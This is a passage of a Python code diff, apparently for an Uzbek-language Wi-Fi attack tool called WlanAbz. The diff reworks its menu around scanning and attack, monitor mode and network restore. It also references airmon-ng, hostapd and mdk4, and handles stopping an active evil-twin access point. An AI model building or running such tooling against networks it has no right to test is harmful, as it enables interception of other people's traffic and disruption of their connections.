     else:
-        console.print("\n[bold red][-] Noto'g'ri tanlov.[/bold red]")
-        time.sleep(1)
-        show_selected_target_menu(target_bssid, target_info, monitor_iface)
+        n = len(result.get("data") or [])
+        warn(result.get("error") or "Tugadi")
+        console.print(f"  Yuborilgan so'rovlar: {n}")
+    pause()
 
 
-def restore_network(monitor_iface):
-    """Monitoring rejimini to'xtatib, tarmoq xizmatlarini qayta tiklash."""
-    if monitor_iface:
-        subprocess.run(
-            ["airmon-ng", "stop", monitor_iface],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        subprocess.run(
-            ["systemctl", "restart", "NetworkManager"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        subprocess.run(
-            ["service", "networking", "restart"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        console.print(
-            "[bold green][+][/bold green] Internet va Wi-Fi holati qayta tiklandi."
-        )
-
+# ═══════════════════════════════════════════════════════
+#  BOSH MENYU
+# ═══════════════════════════════════════════════════════
 
 def main():
-    print_banner()
-
-    welcome_panel = Panel(
-        "[bold white]Xush kelibsiz! WlanAbz vositasidan foydalanish uchun"
-        " variantni tanlang:[/bold white]\n\n"
-        "  [bold green]1[/bold green] -> Wi-Fi skanerlashni boshlash (2.4GHz + 5GHz)\n"
-        "  [bold red]0[/bold red] -> Dasturdan chiqish",
-        title="[bold cyan]BOSH MENYU[/bold cyan]",
-        border_style="cyan",
+    page()  # logo + bo'sh
+    dist = wu.detect_distro()
+    a = "✓" if wu.which("airmon-ng") else "✗"
+    d = "✓" if wu.which("airodump-ng") else "✗"
+    h = "✓" if wu.which("hostapd") else "✗"
+    m = "✓" if wu.which("mdk4") else "✗"
+    console.print(
+        f"  [bright_black]{dist}  ·  airmon {a}  airodump {d}  "
+        f"hostapd {h}  mdk4 {m}[/bright_black]\n"
     )
-    console.print(welcome_panel)
+    item("1", "Skaner va hujum", "green")
+    item("2", "Faqat monitor", "cyan")
+    item("3", "Tarmoqni tiklash", "yellow")
+    item("0", "Chiqish", "white")
 
-    choice = input("\n[?] Tanlovingizni kiriting (1/0): ").strip()
+    c = ask("Tanlov")
 
-    if choice == "1":
-        print_banner()
-        monitor_iface = enable_monitor_mode()
+    if c == "1":
+        mon = pick_and_enable_monitor()
+        if not mon:
+            return main()
+        mon = scan_networks(mon, 32)
+        show_results_and_pick(mon)
+        return
 
-        if monitor_iface:
-            scan_wifi_networks(monitor_iface)
+    if c == "2":
+        mon = pick_and_enable_monitor()
+        if mon:
+            page("Monitor tayyor")
+            ok(mon)
+            console.print(f"  Buyruq: sudo airodump-ng {mon}")
+            pause()
+        restore_all()
+        pause()
+        return main()
 
-            if not networks:
-                restore_network(monitor_iface)
-                return
+    if c == "3":
+        restore_all()
+        pause()
+        return main()
 
-            sorted_networks = sorted(
-                networks.items(), key=lambda x: x[1]["signal"], reverse=True
-            )
-
-            try:
-                target_idx = input(
-                    "\n[?] Batafsil ko'rish uchun Wi-Fi tartib raqamini"
-                    " kiriting: "
-                ).strip()
-                selected_item = sorted_networks[int(target_idx) - 1]
-                target_bssid = selected_item[0]
-                target_info = selected_item[1]
-
-                show_selected_target_menu(
-                    target_bssid, target_info, monitor_iface
-                )
-            except (ValueError, IndexError):
-                console.print(
-                    "\n[bold red][-] Noto'g'ri raqam kiritildi.[/bold red]"
-                )
-                restore_network(monitor_iface)
-    elif choice == "0":
-        console.print(
-            "\n[bold yellow][!] Dastur yakunlandi. Xayr![/bold yellow]"
-        )
+    if c == "0":
+        console.print("\n  Xayr!\n")
         sys.exit(0)
-    else:
-        console.print("\n[bold red][-] Noto'g'ri tanlov kiritildi.[/bold red]")
-        sys.exit(1)
+
+    return main()
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        console.print()
+        if _active_evil_twin:
+            try:
+                _active_evil_twin.stop()
+            except Exception:
+                pass
+        restore_all()
+        sys.exit(0)
